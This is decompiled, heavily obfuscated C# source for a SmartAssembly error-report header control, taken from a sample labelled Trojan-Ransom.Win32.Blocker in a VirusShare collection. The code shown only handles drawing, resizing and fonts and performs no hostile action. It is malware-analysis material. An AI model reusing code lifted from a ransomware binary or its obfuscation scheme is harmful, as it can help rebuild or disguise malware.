// Decompiled with JetBrains decompiler
// Type: SmartAssembly.SmartExceptionsCore.UI.HeaderControl
// Assembly: o4tdggb3, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FA0844EB-EF82-404C-B76C-C092ABDB9392
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.bzqq-b74e3dc76fae79b75c26f27ecb85aae1eae4082a42bfa080f7805f32dedc9d67.exe

using Microsoft.VisualBasic.CompilerServices;
using SmartAssembly.Attributes;
using SmartAssembly.SmartExceptionsWithUI;
using SmartAssembly.SmartUsageCore;
using SmartAssembly.Zip;
using System;
using System.ComponentModel;
using System.Drawing;
using System.Net;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Ⴈ;

namespace SmartAssembly.SmartExceptionsCore.UI
{
  [DesignerCategory("Code")]
  public class HeaderControl : Control
  {
    private SmartAssembly.SmartUsageCore.DoNotPruneAttribute.Ⴅ Ⴅ;

    public IconState IconState
    {
      get
      {
        try
        {
          return this.Ⴅ.Ⴀ;
        }
        catch (Exception ex)
        {
          int num;
          __Boxed<int> o1 = (ValueType) num;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
          throw;
        }
      }
      set
      {
        int num1;
        IconState iconState;
        IconState ⴀ;
        Bitmap bitmap1;
        Bitmap bitmap2;
        Bitmap bitmap3;
        try
        {
          num1 = 9;
          while (true)
          {
            switch (num1)
            {
              case 0:
                iconState = value;
                this.Ⴅ.Ⴀ = iconState;
                ⴀ = this.Ⴅ.Ⴀ;
                goto case 1;
              case 1:
                num1 = 4;
                continue;
              case 2:
              case 4:
                int num2;
                switch (ⴀ)
                {
                  case IconState.Error:
                    num2 = 3;
                    break;
                  case IconState.Warning:
                    num2 = 10;
                    break;
                  default:
                    num2 = 11;
                    break;
                }
                num1 = num2;
                continue;
              case 3:
                bitmap1 = Ⴈ.Ⴐ.Ⴄ(Ⴈ.ႷႭ.ႥႳ(1491049226, 7));
                this.Ⴅ.Ⴐ = bitmap1;
                num1 = 5;
                continue;
              case 5:
              case 6:
                goto label_14;
              case 7:
                bitmap3 = (Bitmap) null;
                this.Ⴅ.Ⴐ = bitmap3;
                num1 = 5;
                continue;
              case 8:
                goto label_15;
              case 10:
                bitmap2 = Ⴈ.Ⴐ.Ⴄ(Ⴈ.ႷႭ.ႥႳ(1491049223, 4));
                this.Ⴅ.Ⴐ = bitmap2;
                num1 = 5;
                continue;
              case 11:
                num1 = 7;
                continue;
              default:
                num1 = this.Ⴅ.Ⴀ == value ? 8 : 0;
                continue;
            }
          }
label_15:
          return;
label_14:
          FatalExceptionEventArgs.Ⴅ((Control) this, 450, 429);
        }
        catch (Exception ex)
        {
          __Boxed<IconState> o1 = (System.Enum) ⴀ;
          __Boxed<IconState> o2 = (System.Enum) iconState;
          Bitmap o3 = bitmap1;
          Bitmap o4 = bitmap2;
          Bitmap o5 = bitmap3;
          __Boxed<int> o6 = (ValueType) num1;
          __Boxed<IconState> o8 = (System.Enum) value;
          StackFrameHelper.CreateException8(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6, (object) this, (object) o8);
          throw;
        }
      }
    }

    [DesignerSerializationVisibility(DesignerSerializationVisibility.Visible)]
    [Browsable(true)]
    public override string Text
    {
      get
      {
        try
        {
          return Ⴈ.ႳႷ.Ⴜ((Control) this.Ⴅ.Ⴗ, 802, 829);
        }
        catch (Exception ex)
        {
          int num;
          __Boxed<int> o1 = (ValueType) num;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
          throw;
        }
      }
      set
      {
        try
        {
          SmartAssembly.License.License.Ⴅ((Control) this.Ⴅ.Ⴗ, value, 692, 739);
        }
        catch (Exception ex)
        {
          string o2 = value;
          StackFrameHelper.CreateException2(ex, (object) this, (object) o2);
          throw;
        }
      }
    }

    public Image Image
    {
      get
      {
        try
        {
          return this.Ⴅ.Ⴄ;
        }
        catch (Exception ex)
        {
          int num;
          __Boxed<int> o1 = (ValueType) num;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
          throw;
        }
      }
      set
      {
        Image image;
        try
        {
          image = value;
          this.Ⴅ.Ⴄ = image;
          FatalExceptionEventArgs.Ⴅ((Control) this, 19, 124);
        }
        catch (Exception ex)
        {
          Image o1 = image;
          Image o3 = value;
          StackFrameHelper.CreateException3(ex, (object) o1, (object) this, (object) o3);
          throw;
        }
      }
    }

    protected override void Dispose(bool disposing)
    {
      int num;
      Icon icon;
      Image image;
      Bitmap bitmap;
      try
      {
        num = 1;
        while (true)
        {
          switch (num)
          {
            case 0:
            case 3:
              goto label_11;
            case 2:
              bitmap = (Bitmap) null;
              this.Ⴅ.Ⴐ = bitmap;
              num = 0;
              continue;
            case 4:
              num = this.Ⴅ.Ⴍ == null ? 7 : 9;
              continue;
            case 5:
              icon = (Icon) null;
              this.Ⴅ.Ⴍ = icon;
              num = 7;
              continue;
            case 6:
              num = this.Ⴅ.Ⴐ == null ? 0 : 10;
              continue;
            case 7:
              num = this.Ⴅ.Ⴄ == null ? 6 : 8;
              continue;
            case 8:
              FatalExceptionEventArgs.Ⴈ(this.Ⴅ.Ⴄ, 267, 328);
              image = (Image) null;
              this.Ⴅ.Ⴄ = image;
              num = 6;
              continue;
            case 9:
              AESCryptoIndirector.Ⴀ(this.Ⴅ.Ⴍ, 879, 887);
              goto case 5;
            case 10:
              FatalExceptionEventArgs.Ⴈ((Image) this.Ⴅ.Ⴐ, 48, 115);
              goto case 2;
            default:
              num = !disposing ? 0 : 4;
              continue;
          }
        }
label_11:
        base.Dispose(disposing);
      }
      catch (Exception ex)
      {
        Icon o1 = icon;
        Image o2 = image;
        Bitmap o3 = bitmap;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) num;
        // ISSUE: variable of a boxed type
        __Boxed<bool> o6 = (ValueType) disposing;
        StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) this, (object) o6);
        throw;
      }
    }

    protected override void OnResize(EventArgs e)
    {
      int num;
      try
      {
        num = 1;
        while (true)
        {
          switch (num)
          {
            case 0:
              num = 3;
              continue;
            case 2:
            case 3:
              goto label_4;
            case 4:
              goto label_5;
            default:
              this.Ⴅ.Ⴗ.SetBounds(SmartAssembly.License.License.Ⴈ(13f * this.Ⴅ.Ⴓ, 1004, 1016), SmartAssembly.License.License.Ⴈ(15f * this.Ⴅ.Ⴈ, 831, 811), ႷႼ.Ⴐ((Control) this, 324, 286) - SmartAssembly.License.License.Ⴈ(69f * this.Ⴅ.Ⴓ, 829, 809), ႷႼ.Ⴐ((Control) this, 309, 366) - Convert.ToInt32(18f * this.Ⴅ.Ⴈ));
              goto case 0;
          }
        }
label_5:
        return;
label_4:
        base.OnResize(e);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num;
        EventArgs o3 = e;
        StackFrameHelper.CreateException3(ex, (object) o1, (object) this, (object) o3);
        throw;
      }
    }

    protected override void ScaleCore(float dx, float dy)
    {
      int num1;
      float num2;
      float num3;
      try
      {
        num1 = 1;
        while (true)
        {
          switch (num1)
          {
            case 0:
              goto label_5;
            case 3:
              num1 = 4;
              continue;
            case 4:
              goto label_4;
            default:
              num2 = dx;
              this.Ⴅ.Ⴓ = num2;
              num3 = dy;
              this.Ⴅ.Ⴈ = num3;
              goto case 3;
          }
        }
label_4:
        base.ScaleCore(dx, dy);
label_5:
        this.OnResize(EventArgs.Empty);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<float> o1 = (ValueType) num2;
        // ISSUE: variable of a boxed type
        __Boxed<float> o2 = (ValueType) num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<float> o5 = (ValueType) dx;
        // ISSUE: variable of a boxed type
        __Boxed<float> o6 = (ValueType) dy;
        StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) this, (object) o5, (object) o6);
        throw;
      }
    }

    protected override void OnPaint(PaintEventArgs e)
    {
      int num1;
      Size size1;
      Size size2;
      Size size3;
      Size size4;
      Size size5;
      Size size6;
      Rectangle rectangle;
      Size size7;
      int num2;
      try
      {
        num1 = 2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              goto label_9;
            case 1:
              num1 = 3;
              continue;
            case 3:
              if (this.Ⴅ.Ⴄ != null)
              {
                num1 = 0;
                continue;
              }
              goto label_13;
            case 4:
              ref Rectangle local = ref rectangle;
              size7 = SimpleZip.ႭႰ.Ⴈ((Control) this, 760, 659);
              int x = SimpleZip.ႤႤ.ႨႣ(ref size7, 959, 953) - SmartAssembly.License.License.Ⴈ(48f * this.Ⴅ.Ⴓ, 783, 795);
              int y = SmartAssembly.License.License.Ⴈ(11f * this.Ⴅ.Ⴈ, 71, 83);
              int width = SmartAssembly.License.License.Ⴈ(32f * this.Ⴅ.Ⴓ, 260, 272);
              int height = SmartAssembly.License.License.Ⴈ(32f * this.Ⴅ.Ⴈ, 858, 846);
              local = new Rectangle(x, y, width, height);
              goto case 1;
            case 5:
              num1 = 6;
              continue;
            case 6:
              Graphics graphics1 = FeedbackControl.Ⴜ(e, 233, 176);
              Pen pen1 = ႷႠ.Ⴄ(31, 38);
              size4 = SimpleZip.ႭႰ.Ⴈ((Control) this, 483, 392);
              int num3 = ReportSender.Ⴓ(ref size4, 610, 520) - 1;
              size5 = SimpleZip.ႭႰ.Ⴈ((Control) this, 53, 94);
              int num4 = SimpleZip.ႤႤ.ႨႣ(ref size5, 711, 705);
              size6 = SimpleZip.ႭႰ.Ⴈ((Control) this, 308, 351);
              int num5 = ReportSender.Ⴓ(ref size6, 921, 1011) - 1;
              UsageCounts.Ⴃ(graphics1, pen1, 0, num3, num4, num5, 283, 270);
              num1 = 4;
              continue;
            case 7:
              goto label_10;
            default:
              base.OnPaint(e);
              Graphics graphics2 = FeedbackControl.Ⴜ(e, 867, 826);
              Pen pen2 = UsageCounts.Ⴀ(377, 340);
              size1 = SimpleZip.ႭႰ.Ⴈ((Control) this, 786, 889);
              int num6 = ReportSender.Ⴓ(ref size1, 174, 196) - 2;
              size2 = SimpleZip.ႭႰ.Ⴈ((Control) this, 385, 490);
              int num7 = SimpleZip.ႤႤ.ႨႣ(ref size2, 28, 26);
              size3 = SimpleZip.ႭႰ.Ⴈ((Control) this, 39, 76);
              int num8 = ReportSender.Ⴓ(ref size3, 944, 986) - 2;
              UsageCounts.Ⴃ(graphics2, pen2, 0, num6, num7, num8, 341, 320);
              goto case 5;
          }
        }
label_10:
        return;
label_9:
        FeedbackControl.Ⴜ(e, 640, 729).DrawImage(this.Ⴅ.Ⴄ, rectangle, new Rectangle(0, 0, 32, 32), GraphicsUnit.Pixel);
        return;
label_13:
        num2 = this.Ⴅ.Ⴍ == null ? 5 : 1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 2:
            case 7:
              num2 = this.Ⴅ.Ⴐ == null ? 5 : 6;
              continue;
            case 1:
              e.Graphics.DrawIcon(this.Ⴅ.Ⴍ, rectangle);
              goto case 0;
            case 4:
              goto label_13;
            case 5:
              goto label_18;
            case 6:
              goto label_16;
            default:
              goto label_12;
          }
        }
label_18:
        return;
label_12:
        // ISSUE: method reference
        RuntimeMethodHandle runtimeMethodHandle = __methodref (HeaderControl.OnPaint);
        return;
label_16:
        e.Graphics.DrawImage((Image) this.Ⴅ.Ⴐ, new Rectangle(rectangle.Right - Convert.ToInt32(12f * this.Ⴅ.Ⴓ), rectangle.Bottom - Convert.ToInt32(12f * this.Ⴅ.Ⴈ), Convert.ToInt32(16f * this.Ⴅ.Ⴓ), Convert.ToInt32(16f * this.Ⴅ.Ⴈ)), new Rectangle(0, 0, 16, 16), GraphicsUnit.Pixel);
      }
      catch (Exception ex)
      {
        object[] objects = new object[12]
        {
          (object) rectangle,
          (object) size1,
          (object) size2,
          (object) size3,
          (object) size4,
          (object) size5,
          (object) size6,
          (object) size7,
          (object) num1,
          (object) num2,
          (object) this,
          (object) e
        };
        StackFrameHelper.CreateExceptionN(ex, objects);
        throw;
      }
    }

    protected override void OnFontChanged(EventArgs e)
    {
      int num1;
      try
      {
        try
        {
          num1 = 4;
          while (true)
          {
            switch (num1)
            {
              case 0:
                goto label_3;
              case 3:
                goto label_6;
              default:
                Ⴈ.Ⴍ.Ⴄ((Control) this.Ⴅ.Ⴗ, new Font(UnhandledExceptionHandlerWithUI.Ⴄ((Control) this, 539, 629), FontStyle.Bold), 963, 1004);
                num1 = 0;
                continue;
            }
          }
label_3:
          base.OnFontChanged(e);
        }
        catch
        {
        }
label_6:
        switch (1)
        {
        }
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num2;
        EventArgs o4 = e;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) this, (object) o4);
        throw;
      }
    }

    public HeaderControl()
    {
      Label label = new Label();
      this.Ⴅ.Ⴗ = label;
      float num1 = 1f;
      this.Ⴅ.Ⴓ = num1;
      float num2 = 1f;
      this.Ⴅ.Ⴈ = num2;
      // ISSUE: explicit constructor call
      base.\u002Ector();
      Icon applicationIcon;
      try
      {
        try
        {
          FeedbackControl.ႨႥ(this.Ⴅ.Ⴗ, FlatStyle.System, 739, 731);
          Ⴈ.Ⴍ.Ⴄ((Control) this.Ⴅ.Ⴗ, new Font(UnhandledExceptionHandlerWithUI.Ⴄ((Control) this, 367, 257), FontStyle.Bold), 905, 934);
        }
        catch
        {
        }
        PoweredByAttribute1.Ⴅ((Control) this, 206, 244).Add((Control) this.Ⴅ.Ⴗ);
        SmartAssembly.SmartExceptionsCore.Win32.ႣႠ((Control) this, ႷႤ.Ⴜ(790, 818), 441, 491);
        Ⴈ.Ⴅ.ႥႥ((Control) this, false, 372, 329);
        this.Dock = DockStyle.Top;
        this.Height = 58;
        this.SetStyle(ControlStyles.UserPaint | ControlStyles.ResizeRedraw | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.DoubleBuffer, true);
        applicationIcon = SmartAssembly.SmartExceptionsCore.Win32.GetApplicationIcon();
        this.Ⴅ.Ⴍ = applicationIcon;
        this.OnResize(EventArgs.Empty);
      }
      catch (Exception ex)
      {
        Label o1 = label;
        // ISSUE: variable of a boxed type
        __Boxed<float> o2 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<float> o3 = (ValueType) num2;
        Icon o4 = applicationIcon;
        StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) this);
        throw;
      }
    }

    public HeaderControl(string text)
      : this()
    {
      try
      {
        SmartAssembly.License.License.Ⴅ((Control) this.Ⴅ.Ⴗ, text, 633, 558);
      }
      catch (Exception ex)
      {
        string o2 = text;
        StackFrameHelper.CreateException2(ex, (object) this, (object) o2);
        throw;
      }
    }

    static HeaderControl()
    {
      try
      {
        SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
      }
      catch (Exception ex)
      {
        StackFrameHelper.CreateException0(ex);
        throw;
      }
    }

    internal static string Ⴍ([In] object obj0, [In] object obj1, [In] object obj2, [In] int obj3, [In] int obj4)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj4 ^ obj3)
        {
          case 14:
            num2 = 2;
            break;
          default:
            num2 = 5;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
              num1 = 3;
              continue;
            case 1:
            case 2:
            case 6:
              goto label_8;
            case 3:
            case 7:
              goto label_3;
            case 5:
              num1 = 3;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (HeaderControl.Ⴍ);
              num1 = 3;
              continue;
          }
        }
label_8:
        return obj0.ToString() + obj1 + obj2;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        object o2 = obj0;
        object o3 = obj1;
        object o4 = obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj4;
        StackFrameHelper.CreateException6(ex, (object) o1, o2, o3, o4, (object) o5, (object) o6);
        throw;
      }
    }

    internal static string Ⴄ([In] char obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 70:
            num2 = 2;
            break;
          default:
            num2 = 6;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 6:
              num1 = 7;
              continue;
            case 2:
            case 5:
              goto label_8;
            case 4:
              num1 = 7;
              continue;
            case 7:
              goto label_3;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (HeaderControl.Ⴄ);
              num1 = 7;
              continue;
          }
        }
label_8:
        return Conversions.ToString(obj0);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<char> o2 = (ValueType) obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }

    internal static void Ⴐ([In] ServicePoint obj0, [In] bool obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
        num1 = 0;
        while (true)
        {
          switch (num1)
          {
            case 1:
              num1 = 0;
              continue;
            case 2:
            case 4:
            case 5:
              goto label_7;
            case 3:
              goto label_8;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 7:
                  num2 = 2;
                  break;
                default:
                  num2 = 1;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_7:
        obj0.Expect100Continue = obj1;
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        ServicePoint o3 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<bool> o4 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj3;
        StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6);
        throw;
      }
    }

    internal static void Ⴅ([In] Graphics obj0, [In] Rectangle obj1, [In] int obj2, [In] int obj3)
    {
      int num1;
      try
      {
        num1 = 1;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 2:
            case 3:
              goto label_7;
            case 4:
              num1 = 1;
              continue;
            case 5:
              goto label_8;
            default:
              int num2;
              switch (obj3 ^ obj2)
              {
                case 111:
                  num2 = 2;
                  break;
                default:
                  num2 = 4;
                  break;
              }
              num1 = num2;
              continue;
          }
        }
label_8:
        return;
label_7:
        obj0.SetClip(obj1);
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        int num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> o2 = (ValueType) num3;
        Graphics o3 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<Rectangle> o4 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o5 = (ValueType) obj2;
        // ISSUE: variable of a boxed type
        __Boxed<int> o6 = (ValueType) obj3;
        StackFrameHelper.CreateException6(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5, (object) o6);
        throw;
      }
    }

    internal static int Ⴜ([In] System.Type obj0, [In] int obj1, [In] int obj2)
    {
      int num1;
      try
      {
label_3:
        int num2;
        switch (obj2 ^ obj1)
        {
          case 102:
            num2 = 0;
            break;
          default:
            num2 = 2;
            break;
        }
        num1 = num2;
        while (true)
        {
          switch (num1)
          {
            case 0:
            case 7:
              goto label_8;
            case 1:
              goto label_3;
            case 2:
              num1 = 1;
              continue;
            case 4:
            case 5:
              num1 = 1;
              continue;
            default:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (HeaderControl.Ⴜ);
              num1 = 1;
              continue;
          }
        }
label_8:
        return obj0.GetArrayRank();
      }
      catch (Exception ex)
      {
        // ISSUE: variable of a boxed type
        __Boxed<int> o1 = (ValueType) num1;
        System.Type o2 = obj0;
        // ISSUE: variable of a boxed type
        __Boxed<int> o3 = (ValueType) obj1;
        // ISSUE: variable of a boxed type
        __Boxed<int> o4 = (ValueType) obj2;
        StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
        throw;
      }
    }
  }
}
